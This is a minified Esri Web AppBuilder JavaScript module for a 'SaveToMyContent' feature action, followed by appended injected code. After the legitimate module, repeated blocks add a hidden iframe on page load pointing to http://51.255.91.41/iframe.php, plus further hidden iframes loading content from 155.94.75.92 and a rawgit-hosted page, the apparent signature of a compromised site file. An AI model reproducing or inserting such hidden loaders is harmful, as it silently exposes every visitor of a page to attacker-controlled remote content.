// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/json dojo/Deferred esri/graphicsUtils jimu/portalUtils jimu/portalUrlUtils jimu/Role jimu/dijit/Message ../BaseFeatureAction jimu/dijit/Popup jimu/dijit/AddItemForm".split(" "),function(g,d,l,m,n,p,q,r,t,k,u,v,w){return g(u,{name:"SaveToMyContent",iconClass:"icon-save",isFeatureSupported:function(a){return 0>=a.features.length||!a.features[0].geometry?!1:this.checkPrivilege()},onExecute:function(a,b){var c=new w({appConfig:this.appConfig}),
f=new v({content:c,titleLabel:window.jimuNls.featureActions.SaveToMyContent,width:525,height:220,buttons:[{label:window.jimuNls.common.ok,onClick:d.hitch(this,function(){c.showBusy();f.disableButton(0);c.validate().then(d.hitch(this,function(d){d.valid?this._addItem(a,b,c):(c.hideBusy(),f.enableButton(0))}))})},{label:window.jimuNls.common.cancel,classNames:["jimu-btn-vacation"],onClick:d.hitch(this,function(){f.close()})}]})},checkPrivilege:function(){var a=r.getStandardPortalUrl(this.appConfig.portalUrl);
if((a=q.getPortal(a))&&a.haveSignIn())return this._hasPrivilege(a);a=new n;a.resolve(!1);return a},_hasPrivilege:function(a){return a.loadSelfInfo().then(d.hitch(this,function(b){if(b&&b.user){var a=new t({id:b.user.roleId?b.user.roleId:b.user.role,role:b.user.role});b.user.privileges&&a.setPrivileges(b.user.privileges);return a.canCreateItem()&&a.canPublishFeatures()}return!1}),function(){return!1})},_addItem:function(a,b,c){var f=c.getName(),g=c.getFolderId(),h=c.popup;b=b||{};var e={name:b.name,
type:b.type||"Feature Layer",displayField:b.displayField,description:b.description,copyrightText:b.copyright,geometryType:b.geometryType||a.geometryType,fields:b.fields||a.fields,objectIdField:b.objectIdField};a.features[0].geometry&&(b=p.graphicsExtent(a.features),e.initialExtent=b,e.fullExtent=b);!e.objectIdField&&e.fields&&l.some(e.fields,function(a){if("esriFieldTypeOID"===a.type)return e.objectIdField=a.name,!0});a={layers:[{layerDefinition:e,featureSet:a.toJson()}]};c.addItem({name:f,title:f,
type:"Feature Collection",typeKeywords:"WAB_created",text:m.stringify(a)},g).then(d.hitch(this,function(a){!0===a.success?h.close():(c.hideBusy(),h.enableButton(0),new k({message:a.error?a.error.message:""}))}),function(a){c.hideBusy();h.enableButton(0);new k({message:a.message})})}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});